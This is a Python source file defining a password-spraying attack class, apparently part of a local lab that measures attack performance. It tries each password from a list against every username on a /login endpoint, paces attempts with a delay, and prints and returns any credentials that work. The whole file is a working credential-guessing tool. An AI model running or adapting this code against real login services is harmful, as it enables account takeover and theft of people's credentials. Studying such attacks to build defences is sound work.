import requests
import time
from .metrics import AttackMetrics

class PasswordSprayAttack:
    def __init__(self, base_url="http://127.0.0.1:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        
    def attack(self, usernames, password_list, metrics: AttackMetrics, delay=0.5):
        """
        Password spray attack: tests each password on all users
        
        Args:
            usernames: list of usernames
            password_list: list of passwords to test
            metrics: AttackMetrics object for data collection
            delay: delay between each attempt (in seconds)
        """
        print(f"🌧️  Starting Password Spray on {len(usernames)} users with {len(password_list)} passwords...")
        
        metrics.start()
        found_credentials = []
        
        for pwd_idx, password in enumerate(password_list, 1):
            print(f"   Testing password: '{password}' ({pwd_idx}/{len(password_list)})")
            
            for user_idx, username in enumerate(usernames, 1):
                start = time.time()
                
                try:
                    response = self.session.post(
                        f"{self.base_url}/login",
                        json={"username": username, "password": password},
                        timeout=10
                    )
                    
                    latency = int((time.time() - start) * 1000)
                    
                    if response.status_code == 200:
                        data = response.json()
                        success = data.get("success", False)
                        
                        if success:
                            found_credentials.append({"username": username, "password": password})
                            metrics.record_attempt(True, latency)
                            print(f"✅ FOUND: {username}:{password}")
                        else:
                            metrics.record_attempt(False, latency)
                    else:
                        metrics.record_attempt(False, latency)
                    
                    # Sample resources
                    if metrics.attempts % 10 == 0:
                        metrics.sample_resources()
                    
                except Exception as e:
                    print(f"❌ Error on {username}: {e}")
                    metrics.record_attempt(False, 0)
                
                # Delay between attempts
                time.sleep(delay)
        
        metrics.stop()
        
        print(f"\n🎯 Summary: {len(found_credentials)} credentials found out of {len(usernames)} accounts")
        return found_credentials

